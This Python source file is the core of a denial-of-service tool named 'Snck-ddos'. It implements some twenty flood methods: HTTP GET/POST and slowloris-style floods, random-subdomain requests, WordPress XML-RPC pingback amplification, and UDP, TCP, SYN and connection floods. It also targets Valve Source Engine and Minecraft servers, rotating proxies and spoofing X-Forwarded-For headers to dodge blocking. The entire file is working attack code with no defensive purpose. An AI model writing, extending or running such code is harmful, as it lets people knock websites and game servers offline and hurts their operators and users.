# language: Python 3.11+, file: core/engine.py, target: Linux / Windows
"""Snck-ddos attack engine — multi-layer methods + proxy rotation."""

from __future__ import annotations

import asyncio
import random
import socket
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse

import aiohttp
from aiohttp import ClientSession, TCPConnector

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

METHODS = [
    "GET", "POST", "HEAD", "STRESS", "SLOW", "PPS", "COOKIE",
    "RHEX", "DYN", "CFB", "OVH", "BYPASS", "GSB", "XMLRPC",
    "UDP", "TCP", "SYN", "ACK", "CPS",
    "ICMP", "VSE", "MCBOT",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
]


def _parse_host_port(target: str, default_port: int = 80) -> tuple[str, int]:
    t = target.strip()
    if "://" not in t:
        t = "http://" + t
    u = urlparse(t)
    host = u.hostname or target.split(":")[0]
    port = u.port or default_port
    return host, port


@dataclass
class AttackStats:
    started: float = field(default_factory=time.time)
    requests: int = 0
    bytes_sent: int = 0
    errors: int = 0
    active_workers: int = 0
    running: bool = False
    method: str = ""
    target: str = ""
    threads: int = 0

    def rps(self) -> float:
        return self.requests / max(time.time() - self.started, 0.001)

    def mbps(self) -> float:
        return (self.bytes_sent * 8) / max(time.time() - self.started, 0.001) / 1_000_000


@dataclass
class AttackConfig:
    target: str
    method: str = "GET"
    threads: int = 200
    duration: int = 60
    proxies: list[str] = field(default_factory=list)
    payload_size: int = 1024
    rate_limit: int = 0


class Engine:
    def __init__(self) -> None:
        self.stats = AttackStats()
        self._tasks: list[asyncio.Task] = []
        self._stop = asyncio.Event()
        self._lock = asyncio.Lock()
        self._proxy_idx = 0

    def _next_proxy(self, proxies: list[str]) -> Optional[str]:
        if not proxies:
            return None
        p = proxies[self._proxy_idx % len(proxies)]
        self._proxy_idx += 1
        return p

    async def _l7_worker(self, session: ClientSession, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        method = cfg.method.upper()
        body = b"A" * cfg.payload_size if method in ("POST", "STRESS") else None
        try:
            while not self._stop.is_set():
                proxy = self._next_proxy(cfg.proxies)
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "*/*",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                    "Cache-Control": "no-cache",
                }
                url = cfg.target
                if method == "DYN":
                    sub = random.randbytes(3).hex()
                    u = urlparse(url if "://" in url else "http://" + url)
                    url = f"{u.scheme}://{sub}.{u.hostname}{u.path or '/'}"
                if method == "XMLRPC" and not url.rstrip("/").endswith("xmlrpc.php"):
                    url = url.rstrip("/") + "/xmlrpc.php"
                    body = (
                        b"<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName>"
                        b"<params><param><value><array><data>"
                        + b"<value><struct><member><name>methodName</name><value><string>pingback.ping</string></value></member></struct></value>" * 20
                        + b"</data></array></value></param></params></methodCall>"
                    )
                try:
                    if method in ("GET", "PPS", "DYN", "CFB", "OVH", "BYPASS", "GSB", "COOKIE", "RHEX"):
                        async with session.get(url, headers=headers, proxy=proxy, ssl=False) as resp:
                            data = await resp.read()
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += len(data) + 160
                    elif method in ("POST", "STRESS", "XMLRPC"):
                        async with session.post(url, data=body, headers=headers, proxy=proxy, ssl=False) as resp:
                            data = await resp.read()
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += len(body or b"") + len(data)
                    elif method == "HEAD":
                        async with session.head(url, headers=headers, proxy=proxy, ssl=False) as resp:
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += 100
                    elif method == "SLOW":
                        async with session.get(url, headers=headers, proxy=proxy, ssl=False, timeout=aiohttp.ClientTimeout(total=40)) as resp:
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += 80
                            await asyncio.sleep(random.uniform(8, 18))
                    else:
                        async with session.get(url, headers=headers, proxy=proxy, ssl=False) as resp:
                            data = await resp.read()
                            async with self._lock:
                                self.stats.requests += 1
                                self.stats.bytes_sent += len(data)
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            self.stats.active_workers -= 1

    async def _udp_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        host, port = _parse_host_port(cfg.target, 80)
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = host
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
            payload = random.randbytes(min(cfg.payload_size, 1400))
            while not self._stop.is_set():
                try:
                    sent = sock.sendto(payload, (ip, port))
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += sent
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            sock.close()
            self.stats.active_workers -= 1

    async def _tcp_worker(self, cfg: AttackConfig, mode: str = "data") -> None:
        self.stats.active_workers += 1
        host, port = _parse_host_port(cfg.target, 80)
        payload = random.randbytes(min(cfg.payload_size, 1400))
        try:
            while not self._stop.is_set():
                try:
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=2.5)
                    if mode != "syn":
                        writer.write(payload)
                        await writer.drain()
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += 0 if mode == "syn" else len(payload)
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            self.stats.active_workers -= 1

    async def _cps_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        host, port = _parse_host_port(cfg.target, 80)
        try:
            while not self._stop.is_set():
                try:
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=1.5)
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += 40
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            self.stats.active_workers -= 1

    async def _icmp_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        host, _ = _parse_host_port(cfg.target, 0)
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = host
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            payload = random.randbytes(64)
            while not self._stop.is_set():
                try:
                    sent = sock.sendto(payload, (ip, random.randint(33434, 33534)))
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += sent
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            sock.close()
            self.stats.active_workers -= 1

    async def _vse_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        host, port = _parse_host_port(cfg.target, 27015)
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            ip = host
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
        try:
            while not self._stop.is_set():
                try:
                    sent = sock.sendto(payload, (ip, port))
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += sent
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            sock.close()
            self.stats.active_workers -= 1

    async def _mcbot_worker(self, cfg: AttackConfig) -> None:
        self.stats.active_workers += 1
        host, port = _parse_host_port(cfg.target, 25565)
        try:
            while not self._stop.is_set():
                try:
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=2.0)
                    hb = host.encode()
                    pkt = bytearray([0x00, 0x47, len(hb)]) + hb + port.to_bytes(2, "big") + bytes([0x01])
                    data = bytes([len(pkt)]) + bytes(pkt) + b"\x01\x00"
                    writer.write(data)
                    await writer.drain()
                    writer.close()
                    try:
                        await writer.wait_closed()
                    except Exception:
                        pass
                    async with self._lock:
                        self.stats.requests += 1
                        self.stats.bytes_sent += len(data)
                except Exception:
                    async with self._lock:
                        self.stats.errors += 1
                await asyncio.sleep(0)
        finally:
            self.stats.active_workers -= 1

    async def start(self, cfg: AttackConfig) -> None:
        if self.stats.running:
            return
        self._stop.clear()
        method = cfg.method.upper()
        if method not in METHODS:
            method = "GET"
            cfg.method = method
        self.stats = AttackStats(running=True, method=method, target=cfg.target, threads=cfg.threads)
        self._tasks.clear()
        l7 = {"GET", "POST", "HEAD", "STRESS", "SLOW", "PPS", "COOKIE", "RHEX", "DYN", "CFB", "OVH", "BYPASS", "GSB", "XMLRPC"}
        if method in l7:
            connector = TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300, force_close=False, enable_cleanup_closed=True, ssl=False)
            session = ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=10, connect=4))
            for _ in range(cfg.threads):
                self._tasks.append(asyncio.create_task(self._l7_worker(session, cfg)))

            async def _timer():
                await asyncio.sleep(cfg.duration)
                await self.stop()
                await session.close()

            self._tasks.append(asyncio.create_task(_timer()))
            return
        if method == "UDP":
            worker = self._udp_worker
        elif method in ("TCP", "ACK"):
            worker = lambda c: self._tcp_worker(c, "data")
        elif method == "SYN":
            worker = lambda c: self._tcp_worker(c, "syn")
        elif method == "CPS":
            worker = self._cps_worker
        elif method == "ICMP":
            worker = self._icmp_worker
        elif method == "VSE":
            worker = self._vse_worker
        elif method == "MCBOT":
            worker = self._mcbot_worker
        else:
            worker = self._udp_worker
        for _ in range(cfg.threads):
            self._tasks.append(asyncio.create_task(worker(cfg)))

        async def _timer():
            await asyncio.sleep(cfg.duration)
            await self.stop()

        self._tasks.append(asyncio.create_task(_timer()))

    async def stop(self) -> None:
        self._stop.set()
        self.stats.running = False
        for t in self._tasks:
            t.cancel()
        await asyncio.gather(*self._tasks, return_exceptions=True)
        self._tasks.clear()
        self.stats.active_workers = 0


engine = Engine()
